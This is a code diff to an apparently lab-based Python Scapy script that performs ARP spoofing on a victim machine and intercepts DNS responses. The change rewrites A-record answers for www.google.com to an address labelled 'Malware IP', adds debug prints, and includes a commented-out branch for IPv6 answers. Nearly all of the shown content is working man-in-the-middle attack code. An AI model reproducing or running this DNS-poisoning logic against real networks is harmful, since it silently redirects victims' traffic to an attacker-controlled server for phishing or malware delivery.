@@ -7,6 +7,7 @@ ipM3 = "192.168.56.103" # IPVictim?
 ipMal = "50.63.7.226"   # Malware IP
 trapUrl = "www.google.com."
 ipTrap = "142.251.32.100"
+ip6Mal = ""
 
 def ARP_spoofing():
     macM1 = "08:00:27:b7:c4:af"
@@ -54,11 +55,17 @@ def process_packet(packet):
         if trapUrl in dns_packet.qd.qname:
             # dns_packet.show()
             print(" ------------- ")
+            print (dns_packet.ancount)
             if (dns_packet.qr == 1):
-                print("Before: " + dns_packet.an.rdata + ', ' + dns_packet.an.rrname)
+                print("Before: " + dns_packet.an.rdata + ', ' + dns_packet.an.rrname + ", type = ")
+                print(dns_packet.an.type)
                 # dns_packet.an.rdata = ipMal
-                dns_packet.an = DNSRR(rrname=trapUrl, rdata=ipMal)
+                if (dns_packet.an.type == 1):
+                    dns_packet.an = DNSRR(rrname=trapUrl, rdata=ipMal) 
+                # elif (dns_packet.an.type == 28):
+                #     dns_packet.an = DNSRR(rrname=trapUrl, rdata=ip6Mal)
                 print("Changed address to: " + dns_packet.an.rdata + ', ' + dns_packet.an.rrname)
+
                 dns_packet.ancount = 1
                 del packet[IP].chksum
                 del packet[IP].len
